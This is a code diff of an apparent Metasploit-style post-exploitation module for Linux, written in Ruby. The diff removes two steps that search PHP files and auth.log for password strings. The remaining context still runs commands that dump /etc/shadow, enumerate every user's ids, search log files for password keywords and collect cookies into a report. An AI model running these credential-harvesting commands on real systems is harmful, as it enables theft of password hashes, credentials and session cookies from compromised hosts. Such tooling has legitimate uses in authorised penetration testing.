@@ -429,12 +429,8 @@ def run
           etc_shadow = cmd_exec("cat /etc/shadow")
           # list all uid/guid id's/info
           uuid_id = cmd_exec("for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done")
-          # find php var password strings
-          php_passwd = cmd_exec("find / -name \"*.php\" -print0 | xargs -0 grep -i -n \"var password\"")
           # Check log files for keywords (pass|passwd|password) and show positive matches (full paths)
           log_auth = cmd_exec("egrep -l -i 'pass|passwd|password|passphrase' /var/log/*.log")
-          # search inside auth.log for (pass|passwd|password) strings and present results
-          search_pass = cmd_exec("cat /var/log/auth.log | egrep -i 'pass|passwd|password'")
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
@@ -465,17 +461,9 @@ def run
             data_dump << "----------------\n"
             data_dump << etc_shadow
             data_dump << "\n\n"
-            data_dump << "PHP PASSWORDS:\n"
-            data_dump << "--------------\n"
-            data_dump << php_passwd
-            data_dump << "\n\n"
             data_dump << "LIST LOGFILES WITH 'PASS' STRING:\n"
             data_dump << "---------------------------------\n"
             data_dump << log_auth
-            data_dump << "\n\n"
-            data_dump << "lIST CREDENTIALS INSIDE AUTH.LOG :\n"
-            data_dump << "----------------------------------\n"
-            data_dump << search_pass
             data_dump << "\n\n"
             data_dump << "LISTING COOKIES :\n"
             data_dump << "-----------------\n"
